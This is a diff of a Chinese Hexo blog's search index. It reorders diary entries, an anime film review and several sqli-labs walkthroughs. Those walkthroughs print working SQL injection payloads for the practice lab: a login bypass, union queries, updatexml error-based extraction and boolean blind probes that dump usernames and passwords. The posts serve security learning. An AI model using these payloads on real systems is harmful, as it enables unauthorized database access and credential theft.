@@ -117,7 +117,7 @@
   <entry>
     <title>多情应笑我</title>
     <url>/2022/11/14/Diary_1114/</url>
-    <content><![CDATA[<p><img src="/images/%E5%87%9B&%E6%8A%9A%E5%AD%90.png" alt="凛和抚子"></p>
+    <content><![CDATA[<p><img src="/images/%E5%87%9B&%E6%8A%9A%E5%AD%905.png" alt="凛和抚子"></p>
 <span id="more"></span>
 
 <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>满足？懈怠？享受？堕落？</p>
@@ -451,26 +451,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2022/11/03/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<span id="more"></span>
-
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>First Blog</title>
     <url>/2022/11/03/first_blog/</url>
     <content><![CDATA[<p><img src="/images/Christina.png" alt="Kurisu Makise"></p>
@@ -514,43 +494,24 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_11+12</title>
-    <url>/2022/11/10/sqli-labs_11+12/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关开始，使用POST提交方式，但只是换了种提交方式，模式和前面的GET还是差不多。</p>
+    <title>Hello World</title>
+    <url>/2022/11/03/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
 <span id="more"></span>
 
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>猜解方式和之前差不多。这里稍微使用点和之前不一样的方式：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1 #   万能密码构造成功，返回账户和密码</span><br></pre></td></tr></table></figure>
-<p>说明：这里的注释要使用#，之前的--+不再适用</p>
-</li>
-<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 2 #   返回正确信息</span><br><span class="line">1&#x27; order by 3 #   返回错误信息</span><br></pre></td></tr></table></figure>
-<p>说明字段数为2</p>
-</li>
-<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select database(),version() #   返回Your Login name:security  Your Password:5.7.26</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br><span class="line">返回emails,referers,uagents,users</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; #</span><br><span class="line">返回id,username,password</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password) from users #  返回用户名和密码</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="第12关和第11关差不多，只是要用1”-or-1-x3D-1"><a href="#第12关和第11关差不多，只是要用1”-or-1-x3D-1" class="headerlink" title="第12关和第11关差不多，只是要用1”) or 1&#x3D;1 #"></a>第12关和第11关差不多，只是要用1”) or 1&#x3D;1 #</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>如果前面掌握了，这关没有难度</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
   </entry>
   <entry>
     <title>SQL注入之sqli-labs_1+2</title>
@@ -616,6 +577,45 @@
 </ul>
 <h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
 <p><a href="https://blog.csdn.net/weixin_48421613/article/details/107488560">关于sql注入暴库爆表爆字段</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs_11+12</title>
+    <url>/2022/11/10/sqli-labs_11+12/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本关开始，使用POST提交方式，但只是换了种提交方式，模式和前面的GET还是差不多。</p>
+<span id="more"></span>
+
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>猜解方式和之前差不多。这里稍微使用点和之前不一样的方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1 #   万能密码构造成功，返回账户和密码</span><br></pre></td></tr></table></figure>
+<p>说明：这里的注释要使用#，之前的--+不再适用</p>
+</li>
+<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 2 #   返回正确信息</span><br><span class="line">1&#x27; order by 3 #   返回错误信息</span><br></pre></td></tr></table></figure>
+<p>说明字段数为2</p>
+</li>
+<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select database(),version() #   返回Your Login name:security  Your Password:5.7.26</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br><span class="line">返回emails,referers,uagents,users</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; #</span><br><span class="line">返回id,username,password</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password) from users #  返回用户名和密码</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="第12关和第11关差不多，只是要用1”-or-1-x3D-1"><a href="#第12关和第11关差不多，只是要用1”-or-1-x3D-1" class="headerlink" title="第12关和第11关差不多，只是要用1”) or 1&#x3D;1 #"></a>第12关和第11关差不多，只是要用1”) or 1&#x3D;1 #</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>如果前面掌握了，这关没有难度</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -738,52 +738,6 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_5+6</title>
-    <url>/2022/11/08/sqli-labs_5+6/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第5，6关基本一致，区别只在于单引号和双引号，因此放在一起了。这两关的关键点在于：正确时不返回结果，错误时有报错信息。因此综合判断之下，使用报错注入的方式最好。</p>
-<span id="more"></span>
-
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>判断是否存在<strong>SQL注入</strong><br>和前几关一致，这里不过多阐述。<br>输入?id&#x3D;1”有报错信息。<br>报错信息为：<br><img src="/simg/sqli-labs_6.png" alt="sqli-labs_6输入?id=1&quot;时的报错信息"></p>
-</li>
-<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由报错信息near ‘“1”” LIMIT 0,1’ at line 1可知是双引号字符型。<br>构造语句?id&#x3D;1”–+</p>
-</li>
-<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure>
-<p>可得字段数为3</p>
-</li>
-<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由于无法返回正常信息，所以不能使用union联合查询<br>使用报错注入常用的函数即可（<a href="https://truthnian.github.io/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">常用函数</a>）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(database(),0x7e,version())),0x23),1)--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
-<p>因为updatexml()函数最多只能显示32个字符，无法显示到所需的数据，所以不能只写where table_name&#x3D;’users’  应该再加一个限定到当前数据库。</p>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x23),1)--+</span><br></pre></td></tr></table></figure>
-<p>因为updatexml()函数最多只能显示32个字符，所需数据可能无法显示完全，因此需要使用limit限制每行显示一组数据。<br><strong>limit</strong>简单解释：<br>limit 3,1  表示返回从第3行起的1行数据，逗号之前的值对应OFFSET，逗号之后的值对应LIMIT。<br>注意：limit第一个被检索的行是第0行，当检索完后不会显示数据</p>
-</li>
-</ol>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
-<li><p><a href="https://blog.csdn.net/wyzhxhn/article/details/127718995">sqli-labs—–第五关</a></p>
-</li>
-<li><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqli-labs_4</title>
     <url>/2022/11/08/sqli-labs_4/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>和第3关其实是同种类型</p>
@@ -820,39 +774,41 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_8</title>
-    <url>/2022/11/09/sqli-labs_8/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第八关页面只能显示对错，而没有任何其它信息，因此我们可以使用布尔盲注和时间盲注。这里主要来讲讲用<a href="https://truthnian.github.io/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a>如何完成的。</p>
+    <title>sqli-labs_5+6</title>
+    <url>/2022/11/08/sqli-labs_5+6/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第5，6关基本一致，区别只在于单引号和双引号，因此放在一起了。这两关的关键点在于：正确时不返回结果，错误时有报错信息。因此综合判断之下，使用报错注入的方式最好。</p>
 <span id="more"></span>
 
 <h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 无任何显示，说明是错误的<br>输入?id&#x3D;1’’  显示：You are in………..<br>输入?id&#x3D;1’--+  显示：You are in………..<br>说明构造成功，且是单引号字符型</p>
+<li><p>判断是否存在<strong>SQL注入</strong><br>和前几关一致，这里不过多阐述。<br>输入?id&#x3D;1”有报错信息。<br>报错信息为：<br><img src="/simg/sqli-labs_6.png" alt="sqli-labs_6输入?id=1&quot;时的报错信息"></p>
 </li>
-<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
+<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由报错信息near ‘“1”” LIMIT 0,1’ at line 1可知是双引号字符型。<br>构造语句?id&#x3D;1”–+</p>
 </li>
-</ol>
-<ul>
-<li>由于无法显示报错信息，我们需要使用length()函数首先判断数据库名长度<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and length(database())&gt;7--+  返回正确</span><br><span class="line">?id=1&#x27;and length(database())&gt;8--+  返回错误</span><br></pre></td></tr></table></figure>
-说明数据库名长度为8</li>
-<li>接下来便是一个个判断字符，这里可以使用substr(),mid(),substring(),ord(),ascii()等，选择比较多，任意选取即可<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;114--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;115--+   返回错误</span><br></pre></td></tr></table></figure>
-说明数据库名第1个字符是s，以此类推，可得数据库名为security<br>数据库版本号也是同理</li>
-</ul>
-<ol start="3">
-<li><p><strong>爆表</strong><br>道理是类似的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;102--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;101--+   返回错误</span><br></pre></td></tr></table></figure>
-<p>说明第一个表名的第1个字符是e，以此类推，可以得到所有表名，最终我们发现关键的表名users<br>这里使用limit的原因是因为一个数据库名中表名很可能不止一个，我们需要依次查询</p>
+<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure>
+<p>可得字段数为3</p>
+</li>
+<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由于无法返回正常信息，所以不能使用union联合查询<br>使用报错注入常用的函数即可（<a href="https://truthnian.github.io/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">常用函数</a>）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(database(),0x7e,version())),0x23),1)--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;106--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;105--+   返回错误</span><br></pre></td></tr></table></figure>
-<p>说明第一个字段名是i，以此类推，可以得到所有字段名，最终我们发现关键的字段名username,password</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
+<p>因为updatexml()函数最多只能显示32个字符，无法显示到所需的数据，所以不能只写where table_name&#x3D;’users’  应该再加一个限定到当前数据库。</p>
 </li>
 <li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;67--+  返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;68--+  返回错误</span><br></pre></td></tr></table></figure>
-<p>说明第一个用户名是D，以此类推，可以得到所有用户名和密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x23),1)--+</span><br></pre></td></tr></table></figure>
+<p>因为updatexml()函数最多只能显示32个字符，所需数据可能无法显示完全，因此需要使用limit限制每行显示一组数据。<br><strong>limit</strong>简单解释：<br>limit 3,1  表示返回从第3行起的1行数据，逗号之前的值对应OFFSET，逗号之后的值对应LIMIT。<br>注意：limit第一个被检索的行是第0行，当检索完后不会显示数据</p>
 </li>
 </ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>手动进行布尔注入或时间注入很麻烦，我们只需要理解并记住其原理步骤即可</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/FourthGuy/article/details/108984045">sqli-labs-master第八关</a></p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
+<li><p><a href="https://blog.csdn.net/wyzhxhn/article/details/127718995">sqli-labs—–第五关</a></p>
+</li>
+<li><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
+</li>
+</ul>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -908,6 +864,50 @@ secure_file_priv 一栏的value为空，即是成功</li>
 <h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
 <li><a href="https://blog.csdn.net/qq_33598708/article/details/124059514">sqli-labs第七关sql注入流程</a></li>
 </ul>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs_8</title>
+    <url>/2022/11/09/sqli-labs_8/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第八关页面只能显示对错，而没有任何其它信息，因此我们可以使用布尔盲注和时间盲注。这里主要来讲讲用<a href="https://truthnian.github.io/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a>如何完成的。</p>
+<span id="more"></span>
+
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 无任何显示，说明是错误的<br>输入?id&#x3D;1’’  显示：You are in………..<br>输入?id&#x3D;1’--+  显示：You are in………..<br>说明构造成功，且是单引号字符型</p>
+</li>
+<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
+</li>
+</ol>
+<ul>
+<li>由于无法显示报错信息，我们需要使用length()函数首先判断数据库名长度<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and length(database())&gt;7--+  返回正确</span><br><span class="line">?id=1&#x27;and length(database())&gt;8--+  返回错误</span><br></pre></td></tr></table></figure>
+说明数据库名长度为8</li>
+<li>接下来便是一个个判断字符，这里可以使用substr(),mid(),substring(),ord(),ascii()等，选择比较多，任意选取即可<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;114--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;115--+   返回错误</span><br></pre></td></tr></table></figure>
+说明数据库名第1个字符是s，以此类推，可得数据库名为security<br>数据库版本号也是同理</li>
+</ul>
+<ol start="3">
+<li><p><strong>爆表</strong><br>道理是类似的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;102--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;101--+   返回错误</span><br></pre></td></tr></table></figure>
+<p>说明第一个表名的第1个字符是e，以此类推，可以得到所有表名，最终我们发现关键的表名users<br>这里使用limit的原因是因为一个数据库名中表名很可能不止一个，我们需要依次查询</p>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;106--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;105--+   返回错误</span><br></pre></td></tr></table></figure>
+<p>说明第一个字段名是i，以此类推，可以得到所有字段名，最终我们发现关键的字段名username,password</p>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;67--+  返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;68--+  返回错误</span><br></pre></td></tr></table></figure>
+<p>说明第一个用户名是D，以此类推，可以得到所有用户名和密码。</p>
+</li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>手动进行布尔注入或时间注入很麻烦，我们只需要理解并记住其原理步骤即可</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/FourthGuy/article/details/108984045">sqli-labs-master第八关</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -1125,6 +1125,24 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
+    <title>搖曳露营电影--TV动画的继承</title>
+    <url>/2022/11/14/%E6%90%96%E6%9B%B3%E9%9C%B2%E8%90%A5movie/</url>
+    <content><![CDATA[<p><img src="/images/yuru4.png" alt="搖曳露营"></p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天终于把时间抽出来，看了这部搖曳露营，心情很愉悦，之前看了点零零星星的评论，以为会很沉重，看的过程提心吊胆的。幸亏不是沉重的影片，满足了！</p>
+<h1 id="延续与改变"><a href="#延续与改变" class="headerlink" title="延续与改变"></a>延续与改变</h1><p>氛围还是那个氛围，舒服呀~<br>整部电影虽有起伏，但幸好波动没那么大，让我的小心脏尚能承受。<br>延续了搖曳露营TV动画的风格，舒缓的音乐，柔和的氛围。里面的人物性格都和她们高中的时候差不多，是熟悉的感觉。<br>今晚还没想好怎么写，净写些口水话，算了，明天写吧。先放几张图上来。<br><img src="/images/yuru3.png" alt="搖曳露营"><br><img src="/images/%E5%87%9B+%E6%8A%9A%E5%AD%907.png" alt="搖曳露营"><br><img src="/images/%E6%8A%9A%E5%AD%902.png" alt="搖曳露营"><br><img src="/images/%E7%8A%AC%E5%B1%B1%E8%91%B52.png" alt="搖曳露营"><br><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B5.png" alt="搖曳露营"><br><img src="/images/%E5%BF%97%E6%91%A9%E5%87%9B6.png" alt="搖曳露营"></p>
+]]></content>
+      <categories>
+        <category>动画</category>
+        <category>搖曳露营</category>
+      </categories>
+      <tags>
+        <tag>动画</tag>
+        <tag>搖曳露营</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>报错注入常用函数</title>
     <url>/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>所谓报错注入，就是SQL注入中页面不会返回正常信息，但是会返回报错信息而产生的一种注入方式。而报错注入在使用函数时会很方便，这里就来介绍三种常用报错函数。</p>
@@ -1198,24 +1216,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </categories>
       <tags>
         <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>搖曳露营电影--TV动画的继承</title>
-    <url>/2022/11/14/%E6%90%96%E6%9B%B3%E9%9C%B2%E8%90%A5movie/</url>
-    <content><![CDATA[<p><img src="/images/yuru4.png" alt="搖曳露营"></p>
-<span id="more"></span>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天终于把时间抽出来，看了这部搖曳露营，心情很愉悦，之前看了点零零星星的评论，以为会很沉重，看的过程提心吊胆的。幸亏不是沉重的影片，满足了！</p>
